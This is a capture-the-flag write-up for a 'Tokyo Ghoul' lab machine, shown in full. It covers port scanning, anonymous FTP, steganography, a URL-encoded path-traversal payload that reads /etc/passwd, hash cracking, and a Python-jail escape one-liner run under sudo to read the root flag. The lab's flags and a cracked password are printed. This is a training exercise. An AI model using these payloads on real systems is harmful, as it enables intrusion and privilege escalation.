> Tokyo Ghoul

# rustscan

sudo rustscan -a $IP --ulimit=5000 --batch-size=4500 -- -sC -sV -Pn -A -O | tee rustscan.log


```
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 need_Help?
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.107.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Tokyo goul
```

We can find a comment line in `http://tokyo.thm/jasonroom.html`. 

`<!-- look don't tell jason but we will help you escape , here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there you will find a freind who will help you -->`

Looks like I have to login to FTP as anonymous user. I found some files.

```
need_Help?/Aogiri_tree.txt
need_Help?/Talk_with_me/
need_Help?/Talk_with_me/need_to_talk => And elf file
need_Help?/Talk_with_me/rize_and_kaneki.jpg
```

Using the hint I ran `rabin2 -z need_to_talk` and we got all strings. And at the start looks like a password.

```
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002008 0x00002008 9   10   .rodata ascii kamishiro
```

On executing the binary we got another string.

```
./need_to_talk 
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

kamishiro> 
Good job. I believe this is what you came for:
You_found_1t
```

Let's try to extract data from the .jpg file.

steghide extract -sf rize_and_kaneki.jpg

# yougotme.txt

```
haha you are so smart kaneki but can you talk my code 

..... .-
....- ....-
....- -....
--... ----.
....- -..
...-- ..---
....- -..
...-- ...--
....- -..
....- ---..
....- .-
...-- .....
..... ---..
...-- ..---
....- .
-.... -.-.
-.... ..---
-.... .
..... ..---
-.... -.-.
-.... ...--
-.... --...
...-- -..
...-- -..


if you can talk it allright you got my secret directory 
```

Decode from `morse code` -> `From Hex` -> `Base64`. And we got `d1r3c70ry_center`.

http://tokyo.thm/d1r3c70ry_center/ => Says scan mee!! Ok OK I will.

Running dirb we got somthing interesting.✨

```
+ http://tokyo.thm/d1r3c70ry_center/index.html (CODE:200|SIZE:312)
```

We are prompted with Yes/No. But when we click those options notng much prompts up. But there is an interesting thing about the link. `http://tokyo.thm/d1r3c70ry_center/claim/index.php?view=flower.gif`

But let's try for `/etc/passwd`. `http://tokyo.thm/d1r3c70ry_center/claim/index.php?view=../../../../etc/passwd`. Says `no no no silly don't do that`. Okkkk🙈. But after URL encoding it I got it to work.

## URL => `http://tokyo.thm/d1r3c70ry_center/claim/index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd`.

And we got something interesting 

`kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash `

Cracked it using john and got the password `password123`. Let's try SSH now!!

We are in as `kamishiro`.🎉🎉🎉

# user.txt

```
e6215e25c0783eb4279693d9f073594a
```

# Privilege Escalation

sudo -l

```
User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
```

## jail.py

```
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
```

 The script won’t let us execute commands who read internal files , we should escape this to read the root flag using using Built-in functions:

```
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
```

And we got our root!!

# root.txt

```
9d790bb87898ca66f724ab05a9e6000b
```
